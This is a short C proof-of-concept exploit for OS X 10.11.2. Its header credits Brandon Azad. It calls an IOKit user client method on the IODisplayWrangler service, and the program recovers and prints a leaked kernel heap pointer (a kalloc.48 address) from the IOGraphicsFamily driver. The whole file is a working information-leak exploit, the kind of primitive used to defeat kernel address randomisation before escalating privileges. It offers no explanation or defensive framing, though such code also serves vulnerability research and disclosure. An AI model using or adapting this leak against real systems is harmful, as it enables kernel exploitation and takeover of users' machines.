/*
 * IOAccelerator-leak.c
 * Brandon Azad
 *
 * IOGraphicsFamily heap pointer leak in IOAccelerationUserClient::extCreate on OS X 10.11.2.
 */

#include <IOKit/IOKitLib.h>
#include <stdio.h>

static int IOAccelerator_heap_leak(uint64_t *kalloc_48) {
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
			IOServiceMatching("IODisplayWrangler"));
	if (service == IO_OBJECT_NULL) {
		return 1;
	}
	io_connect_t connect;
	kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
	IOObjectRelease(service);
	if (kr != KERN_SUCCESS) {
		return 2;
	}
	uint64_t input[2] = { 0, 0 };
	uint64_t ptr;
	uint32_t output_count = 1;
	kr = IOConnectCallMethod(connect, 0,
			input, 2, NULL, 0,
			&ptr, &output_count, NULL, NULL);
	IOServiceClose(connect);
	if (kr != KERN_SUCCESS) {
		return 3;
	}
	if (output_count != 1) {
		return 4;
	}
	*kalloc_48 = (ptr & ~0x1f) | 0xffffff8000000000;
	return 0;
}

int main() {
	uint64_t kalloc_48;
	int err = IOAccelerator_heap_leak(&kalloc_48);
	if (err) {
		return err;
	}
	printf("kalloc.48: 0x%016llx\n", kalloc_48);
	return 0;
}
